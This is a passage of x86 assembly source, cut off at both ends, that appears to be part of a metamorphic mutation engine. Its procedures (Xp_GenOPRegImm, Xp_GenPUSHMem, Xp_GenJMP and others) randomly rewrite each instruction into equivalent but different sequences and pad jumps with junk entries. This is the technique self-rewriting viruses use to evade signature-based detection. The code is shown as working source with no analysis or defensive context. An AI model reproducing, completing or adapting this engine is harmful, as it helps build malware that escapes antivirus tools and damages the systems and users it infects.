                mov     eax, [ebp+Xp_8Bits]     
                or      eax, eax
                jnz   @@Single_OP
                call    Random
                and     eax, 1
                jz    @@Single_OP
                mov     eax, 0FCh               
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                mov     [edi+7], eax
                mov     eax, [ebp+Xp_SrcRegister]
                mov     [edi+2], eax
                xor     eax, eax
                mov     [edi+3], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenOPRegReg  endp


Xp_GenOPRegImm  proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single        

                call    Random
                and     eax, 1
                jz    @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Double
                     
           
   @@Triple:    mov     eax, [ebp+Xp_Operation]
                cmp     eax, 38h         
                jz    @@Double           
                                         
                cmp     eax, 48h         
                jz    @@Double           
                cmp     eax, 40h         
                jz    @@Double           
                                         
                call    Xp_SaveOperation 
                call    Xp_GetTempVar    
                mov     eax, [ebp+Xp_Operation] 
                push    eax                     
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                call    Random
                and     eax, 1
                jz    @@Triple_1                 
                call    Xp_GenOPMemReg           
                pop     eax                      
                mov     [ebp+Xp_Operation], eax  
                call    Xp_GenOPMemImm           
   @@Triple_Common:                              
                mov     eax, 40h                 
                mov     [ebp+Xp_Operation], eax  
                call    Xp_GenOPRegMem           
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel 
                                                 
   @@Triple_1:  call    Xp_GenOPMemImm           
                pop     eax                      
                mov     [ebp+Xp_Operation], eax  
                call    Xp_GenOPMemReg
                jmp   @@Triple_Common

                      
   @@Double:    mov     eax, [ebp+Xp_Operation]  
                cmp     eax, 40h                 
                jz    @@Double_MOV               
                cmp     eax, 38h                 
                jz    @@Double_CMP               
                cmp     eax, 48h                 
                jz    @@Double_TEST              
   @@Double_OP: call    Random
                and     eax, 1

                
                jz    @@Double_OP_Composed   
   @@Double_OP_Normal:
                call    Xp_SaveOperation         
                call    Xp_GetTempVar            
                mov     eax, [ebp+Xp_Operation]
                push    eax
                mov     eax, 40h                 
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPMemImm           
                pop     eax                      
                mov     [ebp+Xp_Operation], eax
                cmp     eax, 38h                 
                jz    @@Double_OP_Normal_Direct  
                cmp     eax, 48h                 
                jz    @@Double_OP_Normal_Direct  
                call    Xp_GenOPRegMem           
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Double_OP_Normal_Direct:
                add     eax, 2                   
                add     eax, [ebp+Xp_8Bits]      
                mov     [edi], eax               
                call    Xp_CopyMemoryReference   
                mov     eax, [ebp+Xp_Register]   
                mov     [edi+7], eax             
                add     edi, 10h                 
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel 

   @@Double_OP_Composed:
                mov     eax, [ebp+Xp_FlagRegOrMem] 
                push    eax                        
                xor     eax, eax                   
                mov     [ebp+Xp_FlagRegOrMem], eax
                call    Xp_MakeComposedOPImm       
                pop     ebx                        
                mov     [ebp+Xp_FlagRegOrMem], ebx 
                or      eax, eax                  
                jnz   @@Double_OP_Normal          
                jmp     Xp_DecreaseRecurseLevel   

   @@Double_MOV:
                call    Random
                and     eax, 1
                jz    @@Double_OP
                mov     eax, [ebp+Xp_8Bits]   
                or      eax, eax
                jnz   @@Double_OP             
                call    Xp_GenPUSHImm         
                call    Xp_GenPOPReg          
                jmp     Xp_DecreaseRecurseLevel
   @@Double_CMP:
                call    Random
                and     eax, 1
                jz    @@Double_OP             
                mov     edx, 38h+4            
                mov     ecx, 28h+4            
                jmp   @@Double_OP_CMPTEST_Common
   @@Double_TEST:
                call    Random
                and     eax, 1
                jz    @@Double_OP
                mov     edx, 48h+4            
                mov     ecx, 20h+4            
   @@Double_OP_CMPTEST_Common:
                call    Xp_SaveOperation    
                push    edx
                push    ecx
                call    Xp_GetTempVar       
                mov     eax, 40h            
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPMemReg
                pop     ecx
                pop     edx
                call    Random
                and     eax, 1
                jz    @@Double_OP_CMPTEST_Next
                mov     edx, ecx
   @@Double_OP_CMPTEST_Next:
                add     edx, [ebp+Xp_8Bits]    
                mov     [edi], edx             
                call    Xp_CopyMemoryReference  
                mov     eax, [ebp+Xp_Immediate] 
                mov     [edi+7], eax            
                add     edi, 10h
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    mov     eax, [ebp+Xp_Operation]  
                cmp     eax, 40h                 
                jz    @@Single_MOV
                cmp     eax, 38h                 
                jz    @@Single_CMP
                cmp     eax, 30h                 
                jz    @@Single_XOR
                or      eax, eax                 
                jz    @@Single_ADD
   @@Single_OP: mov     eax, [ebp+Xp_Operation]  
                add     eax, [ebp+Xp_8Bits]      
                mov     [edi], eax               
                mov     eax, [ebp+Xp_Register]   
                mov     [edi+1], eax
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel

   
   @@Single_MOV:
                mov     eax, [ebp+Xp_Immediate]  
                or      eax, eax                 
                jz    @@Single_MOV_0             
   @@Single_OP_MOV:
                call    Random                 
                and     eax, 3                 
                or      eax, eax
                jnz   @@Single_OP
                mov     eax, [ebp+Xp_8Bits]    
                or      eax, eax
                jnz   @@Single_OP              
                mov     eax, 000808FCh         
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+3], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
   @@Single_MOV_0:                             
                call    Random                 
                and     eax, 3                 
                or      eax, eax
                jz    @@Single_OP_MOV
                cmp     eax, 1                 
                jz    @@Single_MOV_0_XOR
                cmp     eax, 2                 
                jz    @@Single_MOV_0_SUB
   @@Single_MOV_0_AND:                         
                call    Xp_SaveOperation
                mov     eax, 20h               
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPRegImm
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Single_MOV_0_XOR:
                add     eax, 9          
   @@Single_MOV_0_SUB:
                add     eax, 26h        
                mov     ecx, eax
                call    Xp_SaveOperation          
                mov     [ebp+Xp_Operation], ecx   
                mov     eax, [ebp+Xp_Register]    
                mov     [ebp+Xp_SrcRegister], eax 
                call    Xp_GenOPRegReg            
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single_CMP:
                mov     eax, [ebp+Xp_Immediate]  
                or      eax, eax
                jnz   @@Single_OP                
                call    Random
                and     eax, 3
                or      eax, eax
                jz    @@Single_OP        
                cmp     eax, 1
                jz    @@Single_CMP_OR    
                cmp     eax, 2
                jz    @@Single_CMP_AND   
   @@Single_CMP_TEST:                    
                add     eax, 27h   
   @@Single_CMP_AND:
                add     eax, 17h   
   @@Single_CMP_OR:
                add     eax, 8     
                add     eax, [ebp+Xp_8Bits]
                mov     [edi], eax              
                mov     eax, [ebp+Xp_Register]  
                mov     [edi+1], eax            
                mov     [edi+7], eax
                add     edi, 10h                
                jmp     Xp_DecreaseRecurseLevel

   @@Single_XOR:                                
                mov     eax, [ebp+Xp_Immediate] 
                cmp     eax, -1
                jnz   @@Single_OP
                call    Random
                and     eax, 1
                jz    @@Single_OP
                call    Xp_GenNOTReg
                jmp     Xp_DecreaseRecurseLevel

   @@Single_ADD:                                
                mov     eax, [ebp+Xp_Immediate]
                cmp     eax, 1                  
                jz    @@Single_ADD_NOTNEG
                cmp     eax, -1                 
                jz    @@Single_ADD_NEGNOT
   @@Single_OP_ADD:
                call    Random
                and     eax, 1
                jz    @@Single_OP               
                mov     eax, [ebp+Xp_8Bits]
                or      eax, eax                
                jnz   @@Single_OP               
                mov     eax, 0FCh               
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                mov     [edi+7], eax
                mov     eax, 8
                mov     [edi+2], eax
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+3], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
   @@Single_ADD_NOTNEG:
                call    Random
                and     eax, 1
                jz    @@Single_ADD_INC
                call    Random
                and     eax, 1
                jz    @@Single_OP_ADD
                call    Xp_GenNOTReg            
                call    Xp_GenNEGReg            
                jmp     Xp_DecreaseRecurseLevel
   @@Single_ADD_INC:
                xor     ebx, ebx
   @@Single_ADD_INCDEC_Common:
                mov     eax, [ebp+Xp_8Bits]     
                add     eax, 4Eh                
                mov     [edi], eax              
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                mov     [edi+7], ebx            
                add     edi, 10h                
                jmp     Xp_DecreaseRecurseLevel 
   @@Single_ADD_NEGNOT:
                call    Random
                and     eax, 1
                jz    @@Single_ADD_DEC          
                call    Random
                and     eax, 1
                jz    @@Single_OP_ADD         
                call    Xp_GenNEGReg          
                call    Xp_GenNOTReg
                jmp     Xp_DecreaseRecurseLevel
   @@Single_ADD_DEC:
                mov     ebx, 8                   
                jmp   @@Single_ADD_INCDEC_Common 
Xp_GenOPRegImm  endp


Xp_GenOPMemReg  proc
   @@Start:     call    Xp_IncreaseRecurseLevel
                cmp     eax, 3       
                jae   @@Single       
                call    Random
                and     eax, 7
                or      eax, eax
                jnz   @@Single       
                call    Random
   @@Multiple:  mov     eax, [ebp+Xp_8Bits]
                or      eax, eax
                jnz   @@Single           
                                         
                mov     eax, [ebp+Xp_Operation]
                cmp     eax, 40h               
                jz    @@Multiple_MOV
   @@Multiple_OP:
                call    Xp_SaveOperation        
                call    Xp_GenPUSHMem           
                call    Xp_GetTempVar           
                call    Xp_GenPOPMem            
                mov     eax, [ebp+Xp_Operation] 
                cmp     eax, 38h                
                jz    @@Multiple_OP_CMP         
                cmp     eax, 48h                
                jz    @@Multiple_OP_TEST        
   @@Multiple_OP_Common:                        
                call    Xp_GenOPMemReg          
                call    Xp_GenPUSHMem           
                call    Xp_RestoreOperation     
                call    Xp_GenPOPMem
                jmp     Xp_DecreaseRecurseLevel
   @@Multiple_OP_CMP:
                mov     ecx, 3Bh
                mov     edx, 2Bh
                jmp   @@Multiple_OP_CMPTEST_Common
   @@Multiple_OP_TEST:
                mov     ecx, 23h
                mov     edx, 4Bh
   @@Multiple_OP_CMPTEST_Common:
                call    Random
                and     eax, 1
                jz    @@Multiple_OP_CMPTEST_Next
                mov     edx, ecx
   @@Multiple_OP_CMPTEST_Next:
                add     edx, [ebp+Xp_8Bits]
                mov     [edi], edx
                call    Xp_CopyMemoryReference
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Multiple_MOV:
   @@Multiple_MOV_Other:
                call    Random         
                and     eax, 3         
                or      eax, eax       
                jz    @@Multiple_OP    
                cmp     eax, 1
                jz    @@Multiple_MOV_1  
                cmp     eax, 2
                jnz   @@Multiple_MOV_Other
   @@Multiple_MOV_2:
                call    Xp_GenPUSHReg    
                call    Xp_GenPOPMem
                jmp     Xp_DecreaseRecurseLevel
   @@Multiple_MOV_1:
                call    Xp_SaveOperation       
                call    Xp_GetTempVar          
                jmp   @@Multiple_OP_Common

   @@Single:    mov     eax, [ebp+Xp_Operation]
                add     eax, [ebp+Xp_8Bits]     
                add     eax, 3                  
                mov     [edi], eax
                call    Xp_CopyMemoryReference  
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenOPMemReg  endp


Xp_GenOPRegMem  proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3        
                jae   @@Single        
                call    Random
                and     eax, 3
                or      eax, eax      
                jnz   @@Single        
   @@Multiple:  mov     eax, [ebp+Xp_8Bits]
                or      eax, eax                     
                jnz   @@Single                       
                mov     eax, [ebp+Xp_Operation]
                cmp     eax, 40h                     
                jz    @@Multiple_MOV
   @@Multiple_OP:
                call    Random
                and     eax, 1
                jz    @@Single
                call    Xp_SaveOperation         
                call    Xp_GenPUSHMem
                call    Xp_GetTempVar            
                call    Xp_GenPOPMem             
                call    Xp_GenOPRegMem           
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Multiple_MOV:
                call    Random
                and     eax, 1
                jz    @@Multiple_OP
                call    Xp_GenPUSHMem       
                call    Xp_GenPOPReg        
                jmp     Xp_DecreaseRecurseLevel

   @@Single:    mov     eax, [ebp+Xp_Operation]
                add     eax, [ebp+Xp_8Bits]
                add     eax, 2              
                mov     [edi], eax
                call    Xp_CopyMemoryReference
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenOPRegMem  endp

Xp_GenOPMemImm  proc
   @@Start:     call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 1
                jz    @@Single             
                call    Random
                and     eax, 3
                or      eax, eax   
                jnz   @@Double
   @@Triple:    mov     eax, [ebp+Xp_8Bits]
                or      eax, eax        
                jnz   @@Double          
                call    Xp_GenPUSHMem    
                call    Xp_SaveOperation
                call    Xp_GetTempVar    
                call    Xp_GenPOPMem
                mov     eax, [ebp+Xp_Operation]
                cmp     eax, 38h                
                jz    @@Triple_CMP
                cmp     eax, 48h                
                jz    @@Triple_TEST
                call    Xp_GenOPMemImm       
                call    Xp_GenPUSHMem        
                call    Xp_RestoreOperation
                call    Xp_GenPOPMem         
                jmp     Xp_DecreaseRecurseLevel
   @@Triple_CMP:
                mov     ecx, 2Ch             
                mov     edx, 3Ch             
                jmp   @@Triple_CMPTEST_Common
   @@Triple_TEST:
                mov     ecx, 24h             
                mov     edx, 4Ch             
   @@Triple_CMPTEST_Common:
                call    Random
                and     eax, 1
                jz    @@Triple_CMPTEST_Next
                mov     edx, ecx
   @@Triple_CMPTEST_Next:
                add     edx, [ebp+Xp_8Bits]  
                mov     [edi], edx
                call    Xp_CopyMemoryReference  
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Double:    mov     eax, [ebp+Xp_Operation]
                cmp     eax, 40h                 
                jz    @@Double_MOV
                or      eax, eax                 
                jz    @@Double_ADD
                cmp     eax, 38h                 
                jz    @@Single
                cmp     eax, 48h                 
                jz    @@Single
   @@Double_OP: mov     eax, [ebp+Xp_FlagRegOrMem]
                push    eax
                mov     eax, 1                     
                mov     [ebp+Xp_FlagRegOrMem], eax 
                call    Xp_MakeComposedOPImm       
                pop     ebx
                mov     [ebp+Xp_FlagRegOrMem], ebx 
                or      eax, eax                   
                jnz   @@Single                     
                jmp     Xp_DecreaseRecurseLevel
   @@Double_MOV:
                call    Random
                and     eax, 1
                jz    @@Double_OP
                mov     eax, [ebp+Xp_8Bits]     
                or      eax, eax                
                jnz   @@Double_OP
                call    Xp_GenPUSHImm           
                call    Xp_GenPOPMem            
                jmp     Xp_DecreaseRecurseLevel
   @@Double_ADD:
                call    Random
                and     eax, 1
                jz    @@Double_OP
                mov     eax, [ebp+Xp_Immediate]
                cmp     eax, 1                  
                jz    @@Double_ADD_NOTNEG       
                cmp     eax, -1                 
                jnz   @@Double_OP               
   @@Double_ADD_NEGNOT:
                call    Xp_GenNEGMem            
                call    Xp_GenNOTMem            
                jmp     Xp_DecreaseRecurseLevel 
   @@Double_ADD_NOTNEG:
                call    Xp_GenNOTMem            
                call    Xp_GenNEGMem            
                jmp     Xp_DecreaseRecurseLevel 


   @@Single:    mov     eax, [ebp+Xp_Operation] 
                cmp     eax, 30h                
                jz    @@Single_XOR
                or      eax, eax                
                jz    @@Single_ADD
   @@Single_OP: mov     eax, [ebp+Xp_Operation] 
                add     eax, [ebp+Xp_8Bits]
                add     eax, 4
                mov     [edi], eax
                call    Xp_CopyMemoryReference  
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
   @@Single_XOR:                                
                mov     eax, [ebp+Xp_Immediate] 
                cmp     eax, -1
                jnz   @@Single_OP               
                call    Random
                and     eax, 1
                jz    @@Single_OP
                call    Xp_GenNOTMem
                jmp     Xp_DecreaseRecurseLevel
   @@Single_ADD:
                call    Random
                and     eax, 1
                jz    @@Single_OP
                mov     eax, [ebp+Xp_Immediate]
                cmp     eax, 1
                jz    @@Single_INC
                cmp     eax, -1
                jnz   @@Single_OP
     @@Single_DEC:
                mov     ebx, 8                
     @@Single_INCDEC_Common:
                mov     eax, [ebp+Xp_8Bits]   
                add     eax, 4Fh              
                mov     [edi], eax            
                push    ebx                   
                call    Xp_CopyMemoryReference 
                pop     ebx
                mov     [edi+7], ebx          
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
     @@Single_INC:
                xor     ebx, ebx              
                jmp   @@Single_INCDEC_Common
Xp_GenOPMemImm  endp


Xp_GenPOPReg    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 2
                or      eax, eax
                jnz   @@Single     
    @@Multiple: call    Xp_SaveOperation
                call    Xp_GetTempVar     
                call    Xp_GenPOPMem      
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPRegMem    
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

    @@Single:   mov     eax, 58h            
                jmp     Xp_GenPUSHReg_Common
Xp_GenPOPReg    endp


Xp_GenPOPMem    proc
                call    Xp_IncreaseRecurseLevel
    @@Single:   mov     eax, 59h
                jmp     Xp_GenPUSHMem_Common
Xp_GenPOPMem    endp


Xp_GenPUSHReg   proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 2
                or      eax, eax
                jnz   @@Single           
   @@Multiple:  call    Xp_SaveOperation
                call    Xp_GetTempVar    
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax 
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPMemReg
                call    Xp_GenPUSHMem           
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    mov     eax, 50h                
Xp_GenPUSHReg_Common:
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenPUSHReg   endp


Xp_GenPUSHMem   proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3        
                or      eax, eax      
                jnz   @@Single
                call    Xp_SaveOperation
                call    Xp_GenPUSHMem    
                call    Xp_GetTempVar    
                call    Xp_GenPOPMem
                call    Xp_GenPUSHMem    
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    mov     eax, 51h         
Xp_GenPUSHMem_Common:
                mov     [edi], eax
                call    Xp_CopyMemoryReference
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenPUSHMem   endp


Xp_GenPUSHImm   proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 1
                jz    @@Single
   @@Multiple:  call    Xp_SaveOperation
                call    Xp_GetTempVar           
                mov     eax, 40h                
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPMemImm
                call    Xp_GenPUSHMem           
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    mov     eax, 68h
                mov     [edi], eax            
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenPUSHImm   endp


Xp_GenNEGMem    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Single
                                         
                call    Xp_GenNOTMem     
                call    Xp_SaveOperation
                mov     eax, 1
                jmp     Xp_GenNOTMem_Common

   @@Single:    mov     eax, [ebp+Xp_8Bits]
                or      eax, eax
                jz    @@NEG32
                mov     eax, 0E7h
                jmp     Xp_GenNOTMem_Common_Direct
      @@NEG32:  mov     eax, 0E5h
                jmp     Xp_GenNOTMem_Common_Direct
Xp_GenNEGMem    endp



Xp_GenNEGReg    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Single

                call    Xp_GenNOTReg        
                call    Xp_SaveOperation
                mov     eax, 1
                jmp     Xp_GenNOTReg_Common

   @@Single:    mov     eax, [ebp+Xp_8Bits]
                or      eax, eax
                jz    @@NEG32
                mov     eax, 0E6h
                jmp     Xp_GenNOTReg_Common_Direct
      @@NEG32:  mov     eax, 0E4h
                jmp     Xp_GenNOTReg_Common_Direct
Xp_GenNEGReg    endp


Xp_GenNOTReg    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 2
                or      eax, eax              
                jnz   @@Single                
                call    Xp_GenNEGReg          
                call    Xp_SaveOperation
                mov     eax, -1               
Xp_GenNOTReg_Common:
                mov     [ebp+Xp_Immediate], eax
                xor     eax, eax
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPRegImm
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

    @@Single:   mov     eax, [ebp+Xp_8Bits]   
                or      eax, eax
                jz    @@NOT32
                mov     eax, 0E2h
                jmp   @@NOT_
      @@NOT32:  mov     eax, 0E0h
      @@NOT_:
Xp_GenNOTReg_Common_Direct:
                mov     [edi], eax         
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenNOTReg    endp


Xp_GenNOTMem    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Single
                                         
                call    Xp_GenNEGMem     
                call    Xp_SaveOperation
                mov     eax, -1
Xp_GenNOTMem_Common:
                mov     [ebp+Xp_Immediate], eax
                xor     eax, eax
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPMemImm
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    mov     eax, [ebp+Xp_8Bits]
                or      eax, eax
                jz    @@NOT32
                mov     eax, 0E3h
                jmp   @@NOT_
      @@NOT32:  mov     eax, 0E1h
      @@NOT_:
Xp_GenNOTMem_Common_Direct:
                mov     [edi], eax      
                call    Xp_CopyMemoryReference
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenNOTMem    endp


Xp_GenCALLReg   proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 2             
                or      eax, eax           
                jnz   @@Single
                call    Xp_SaveOperation
                call    Xp_GetTempVar      
                mov     eax, 40h           
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPMemReg
                call    Xp_GenCALLMem
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Single:    mov     eax, 0ECh          
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenCALLReg   endp



Xp_GenCALLMem   proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 1
                jnz   @@Single      
   @@Multiple:  call    Random
                and     eax, 1

                jz    @@Multiple_Reg   
                call    Xp_SaveOperation
                call    Xp_GenPUSHMem   
                call    Xp_GetTempVar
                call    Xp_GenPOPMem    
                call    Xp_GenCALLMem   
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Multiple_Reg:
                call    Xp_SaveOperation
   @@Multiple_Reg_Again:
                call    Random
                and     eax, 3
                cmp     eax, 3
                jz    @@Multiple_Reg_Again   
                mov     [ebp+Xp_Register], eax
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPRegMem       
                call    Xp_GenCALLReg        
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    mov     eax, 0EAh        
Xp_GenCALLMem_Common:
                mov     [edi], eax
                call    Xp_CopyMemoryReference
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenCALLMem   endp


Xp_GenRET       proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Single        
                call    Xp_SaveOperation
                call    Xp_GetTempVar        
                call    Xp_GenPOPMem         
                call    Xp_GenJMPMem         
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
     @@Single:  mov     eax, 0FEh            
                mov     [edi], eax           
                add     edi, 10h             
                jmp     Xp_DecreaseRecurseLevel
Xp_GenRET       endp


Xp_GenJMP       proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single  
                                
                mov     eax, [ebp+AddressOfLastInstruction]
                sub     eax, 10h
                cmp     eax, esi   
                jz    @@Single     
                call    Random
                and     eax, 3     
                or      eax, eax
                jnz   @@Single
   @@Double_Other:
                call    Random     
                and     eax, 3     
                or      eax, eax
                jz    @@Double_Other
                cmp     eax, 1         
                jz    @@Double_JccJcc
                cmp     eax, 2         
                jz    @@Double_CMPJcc
                                       
                mov     edx, 73h
                mov     ecx, 76h
   @@Double_JccJcc2:
                call    Random
                or      eax, eax            
                jz    @@Double_JccJcc2_Next 
                mov     edx, 75h            
   @@Double_JccJcc2_Next:                   
                call    Random
                and     eax, 1
                jz    @@Double_JccJcc2_Next02
                mov     eax, edx            
                mov     edx, ecx
                mov     ecx, eax
   @@Double_JccJcc2_Next02:
                call    Xp_SaveOperation
                push    ecx                 
                mov     [ebp+Xp_Operation], edx

                call    Xp_GenJcc_SingleJcc 
                pop     ecx                 
                mov     [ebp+Xp_Operation], ecx
                call    Xp_GenJcc_SingleJcc 
                call    Xp_RestoreOperation
                jmp   @@InsertStopMark      
                                  
                                  
                                  
   @@Double_CMPJcc:
                call    Xp_SaveOperation  
                mov     eax, 38h
                mov     [ebp+Xp_Operation], eax
   @@Double_CMPJcc_x:
                call    Random            
                and     eax, 7
                cmp     eax, 4            
                jz    @@Double_CMPJcc_x
                mov     [ebp+Xp_Register], eax     
                mov     [ebp+Xp_SrcRegister], eax  
                xor     eax, eax                   
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPRegReg    
                call    Xp_GetSpecialJcc  
   @@Double_CMPJcc_Common:                
                xor     eax, 1            
                mov     [ebp+Xp_Operation], eax  
                                                 
                call    Xp_GenJcc_SingleJcc   
                call    Xp_RestoreOperation
                jmp   @@InsertStopMark    
   @@Double_JccJcc:
                call    Xp_SaveOperation 
                call    Random           
                and     eax, 0Fh         
                add     eax, 70h         
                mov     [ebp+Xp_Operation], eax 
                push    eax                 
                call    Xp_GenJcc_SingleJcc 
                pop     eax                 
                jmp   @@Double_CMPJcc_Common 
                                             
                                             
   @@Single:    mov     eax, 0E9h        
                mov     [edi], eax
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+1], eax
                add     edi, 10h
Xp_EndJmp:
                call    Random         
                and     eax, 2         
                or      eax, eax
                jnz     Xp_DecreaseRecurseLevel
                call    Random         
                and     eax, 7
                add     eax, 1
                mov     ecx, eax
      @@LoopInsert:
                call    Random        
                mov     al, 0FDh      
                mov     [edi], eax    
                add     edi, 10h
                sub     ecx, 1
                or      ecx, ecx      
                jnz   @@LoopInsert    
                jmp     Xp_DecreaseRecurseLevel


@@InsertStopMark:
                call    Random
                and     eax, 3
                or      eax, eax       
                jz    @@InsertStopMark 
                cmp     eax, 1
                jz    @@GenerateRET    
                cmp     eax, 2
                jz    @@GenerateJMPMem 
                
   @@GenerateJMPReg:
                call    Xp_SaveOperation
                call    Random           
                and     eax, 7           
                mov     [ebp+Xp_Register], eax
                xor     eax, eax         
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenJMPReg     
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel        
   @@GenerateJMPMem:
                call    Xp_SaveOperation 
                call    Xp_GetTempVar             
                          
                call    Xp_GenJMPMem           
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@GenerateRET:
                call    Xp_GenRET              
                jmp     Xp_DecreaseRecurseLevel
Xp_GenJMP       endp

Xp_GenJMPReg    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 1
                jz    @@Single
                call    Random
                and     eax, 2        
                or      eax, eax
                jz    @@Double_1
   @@Double_0:  call    Xp_SaveOperation
                call    Xp_GetTempVar         
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenOPMemReg        
                call    Xp_GenJMPMem          
                call    Xp_RestoreOperation   
                jmp     Xp_EndJmp             
   @@Double_1:  call    Xp_GenPUSHReg         
                call    Xp_GenRET
                jmp     Xp_EndJmp

   @@Single:    mov     eax, 0EDh             
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                add     edi, 10h
                jmp     Xp_EndJmp             
Xp_GenJMPReg    endp

Xp_GenJMPMem    proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Single
                call    Xp_SaveOperation
                call    Xp_GenPUSHMem      
                call    Xp_GetTempVar
